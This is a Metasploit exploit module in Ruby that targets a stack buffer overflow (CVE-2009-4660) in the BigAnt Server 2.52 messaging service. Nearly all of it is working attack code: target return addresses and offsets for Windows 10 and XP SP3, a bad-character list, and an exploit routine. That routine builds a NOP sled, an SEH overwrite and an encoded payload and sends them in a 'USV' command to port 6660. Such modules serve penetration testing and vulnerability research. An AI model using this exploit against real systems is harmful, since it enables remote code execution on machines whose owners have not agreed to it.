##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'BigAnt Server 2.52 USV Buffer Overflow',
      'Description'    => %q{
        This exploits a stack buffer overflow in the BigAnt Messaging Service,
        part of the BigAnt Server product suite. This module was tested
        successfully against version 2.52.

        NOTE: The AntServer service does not restart, you only get one shot.
      },
      'Author' 	 =>
        [
          'Lincoln',
          'DouBle_Zer0',
          'jduck',
          'Paolo Stagno - voidsec@voidsec.com - https://voidsec.com'  #Win10 PoC module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2009-4660' ],
          [ 'OSVDB', '61386' ],
          [ 'EDB', '10765' ],
          [ 'EDB', '10973' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'seh'
        },
      'Payload'        =>
        {
          'Space' => 704,
          'BadChars' => "\x00\x0a\x0d\x20\x25"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'BigAnt 2.52 Win10', {
              'Ret' => 0x0f9d34fc,
              'Offset' => 962
          } ],  #Tested on Windows 10 x64 Pro v.10.0.18363 Build 18363
          [ 'BigAnt 2.52 XPSP3', {
              'Ret' => 0x1b019fd6,
              'Offset' => 962
          } ],
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Dec 29 2009'))

      register_options([Opt::RPORT(6660)])
  end

  def exploit
    connect
    max_buff_length = 2500
    sploit = ""
    sploit << make_nops(target['Offset'])
    sploit << generate_seh_payload(target.ret)
    sploit << payload.encoded
    sploit << make_nops(max_buff_length-sploit.length)
    print_status("Trying target #{target.name}...")
    sock.put("USV " + sploit + "\r\n\r\n")

    handler
    disconnect
  end
end
